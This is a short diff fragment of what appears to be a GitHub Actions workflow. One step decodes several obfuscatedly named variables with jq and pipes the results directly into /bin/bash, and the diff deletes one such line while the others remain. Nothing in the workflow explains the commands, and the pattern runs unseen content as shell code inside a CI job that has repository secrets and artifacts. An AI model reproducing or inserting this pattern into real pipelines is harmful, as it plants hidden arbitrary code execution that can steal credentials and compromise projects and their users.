@@ -24,7 +24,6 @@ jobs:
           echo $ime59717 | jq -r .bz28 | /bin/bash
           printf '%s' "$oe37641" | jq -r .d2503 | /bin/bash
           echo $lil9 | jq -r .orcig93742 | /bin/bash
-          printf '%s' "$ethx3572" | jq -r .epp26 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
